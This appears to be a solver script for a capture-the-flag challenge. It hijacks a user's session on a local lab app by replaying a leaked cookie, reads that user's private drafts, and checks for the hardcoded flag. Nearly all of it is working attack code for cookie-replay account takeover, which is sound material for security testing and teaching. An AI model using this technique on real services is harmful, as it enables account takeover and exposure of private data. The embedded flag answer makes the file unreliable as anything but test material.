import requests
import os
import uuid

BASE_URL = "http://host.docker.internal:18109"
TARGET_COOKIE = "aero_sess_flagbeast_2026_stolen_flag"
EXPECTED_FLAG = "RCC{aero_session_hijack_1n_th3_w1ld}"

print("[*] Testing solver against running container...")
print(f"[*] Target: {BASE_URL}")

# Step 1: Verify the leak post is accessible
print("[1] Fetching public timeline...")
resp = requests.get(f"{BASE_URL}/api/timeline")
resp.raise_for_status()
posts = resp.json().get("posts", [])

leak_post = None
flagbeast_post = None
for post in posts:
    if post["authorHandle"] == "AnonymousArchive" and "SESSION LEAK" in post["content"]:
        leak_post = post
    if post["authorHandle"] == "FlagBeast" and "Stole someone" in post["content"]:
        flagbeast_post = post

if not leak_post:
    print("[-] Leak post not found!")
    exit(1)
if not flagbeast_post:
    print("[-] FlagBeast boast post not found!")
    exit(1)

print(f"[+] Found FlagBeast boast: {flagbeast_post['id']}")
print(f"[+] Found AnonymousArchive leak: {leak_post['id']}")

if TARGET_COOKIE not in leak_post["content"]:
    print(f"[-] Target cookie not in leak!")
    exit(1)
print(f"[+] Target cookie found in leak: {TARGET_COOKIE}")
print()

# Step 2: Register a throwaway account
print("[2] Registering throwaway account...")
handle = f"solver_{uuid.uuid4().hex[:8]}"
resp = requests.post(f"{BASE_URL}/api/register", json={
    "handle": handle,
    "displayName": "Solver",
    "password": "password123"
})
resp.raise_for_status()
data = resp.json()
session_cookie = resp.cookies.get("aero_session")
print(f"[+] Registered as @{handle}")
print(f"[+] Got session cookie: {session_cookie}")
print()

# Step 3: Replace cookie with target
print("[3] Replacing session cookie with @FlagBeast's leaked token...")
session = requests.Session()
session.cookies.set("aero_session", TARGET_COOKIE, domain="host.docker.internal", path="/")

# Step 4: Verify we're now @FlagBeast
print("[4] Verifying identity as @FlagBeast...")
resp = session.get(f"{BASE_URL}/api/me")
resp.raise_for_status()
me = resp.json()

if not me.get("authenticated"):
    print("[-] Not authenticated after cookie replacement!")
    exit(1)

user = me.get("user", {})
if user.get("handle") != "FlagBeast":
    print(f"[-] Expected @FlagBeast, got @{user.get('handle')}")
    exit(1)

print(f"[+] Successfully authenticated as @{user['handle']} ({user['displayName']})")
print()

# Step 5: Access drafts
print("[5] Accessing private drafts...")
resp = session.get(f"{BASE_URL}/api/drafts")
resp.raise_for_status()
drafts = resp.json().get("drafts", [])

if not drafts:
    print("[-] No drafts found!")
    exit(1)

print(f"[+] Found {len(drafts)} draft(s)")
for draft in drafts:
    print(f"    Draft {draft['id']}: {draft['content'][:80]}...")
    if EXPECTED_FLAG in draft["content"]:
        print(f"[+] FLAG FOUND: {EXPECTED_FLAG}")
        exit(0)

print(f"[-] Expected flag not found in drafts!")
exit(1)
